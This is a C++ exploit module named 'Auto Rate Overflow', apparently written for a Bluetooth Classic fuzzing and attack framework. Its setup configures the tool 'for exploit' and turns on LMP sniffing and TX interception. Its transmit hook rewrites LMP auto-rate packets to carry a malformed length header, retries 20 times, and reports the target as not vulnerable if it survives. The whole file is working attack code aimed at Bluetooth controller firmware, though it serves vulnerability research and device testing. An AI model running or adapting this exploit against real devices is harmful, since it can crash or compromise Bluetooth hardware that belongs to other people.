#include "ModulesInclude.hpp"
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>


// Filters

// Vars

// Setup
static const char *module_name()
{
    return "Auto Rate Overflow";
}

static int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->fuzzing.packet_retry = true;
    config->fuzzing.packet_retry_timeout_ms = 5000;
    config->options.auto_start = true;
    config->options.program = 1;
    config->options.auto_restart = false;
    config->bluetooth.bridge_hci = true;
    config->bluetooth.intercept_tx = true;
    config->bluetooth.lmp_sniffing = true;
    config->bluetooth.rx_bypass = false;
    config->bluetooth.rx_bypass_on_demand = false;
    config->bluetooth.disable_role_switch = false;
    config->bluetooth.randomize_own_bt_address = true;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;
    config->fuzzing.enable_optimization = false;

    return 0;
}

// TX
static int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static int toggle = 0;
static int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    static char txt[64];
    static uint tx_count = 1;
    // here -------------
    if (p && pkt_length > 4 && ((pkt_buf[4] >> 1) == 35))
    {
        // pkt_buf[2] = 0xa3;
        pkt_buf[2] = (22 << 3) | 7;
        // pkt_buf[3] = 0x01;
        snprintf(txt, sizeof(txt), "ACL Length=22 Sent [Attempt %d/20]", tx_count);
        wd_log_y(txt);
        tx_count++;
        module_request_t *m = (module_request_t *)p;
        if (tx_count > 20)
        {
            tx_count = 1;
            wd_log_g("Device is not vulnerable. Have a good day!");
            m->stop = 1;
        }
        return 1; // Indicate that packet has been changed
    }

    return 0;
}

// table_req
static uint8_t packet[] = {0x19, 0x0,
                           0xf, 0x0, 0x46, 0x21};

// RX
static int rx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{

    return 0;
}

static int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}